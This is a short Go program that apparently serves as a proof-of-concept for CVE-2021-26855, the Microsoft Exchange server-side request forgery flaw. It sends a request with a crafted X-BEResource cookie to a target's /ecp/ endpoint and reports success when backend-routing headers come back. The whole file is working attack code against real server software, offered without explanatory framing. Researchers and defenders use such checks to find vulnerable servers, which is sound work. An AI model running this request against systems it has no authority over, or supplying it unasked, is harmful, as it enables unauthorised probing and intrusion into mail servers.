package main

import (
	"fmt"
	"net/http"
	"os"
)

func main() {
	fmt.Println("Usage: ./cve_2021_26855 url")
	targeturl := os.Args[1]
	random_file := "poc.ttf"
	client := &http.Client{}

	req, err := http.NewRequest("GET", targeturl+"/ecp/"+random_file, nil)
	if err != nil {
		panic(err)
	}

	req.Header.Set("Cookie", "X-BEResource=localhost~1942062522")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode == 200 && resp.Header.Get("X-CalculatedBETarget") != "" && resp.Header.Get("X-FEServer") != "" {
		fmt.Println("poc success")
		fmt.Println("X-CalculatedBETarget:", resp.Header.Get("X-CalculatedBETarget"))
		fmt.Println("X-FEServer:", resp.Header.Get("X-FEServer"))
	} else {
		fmt.Println("poc fail")
	}
}
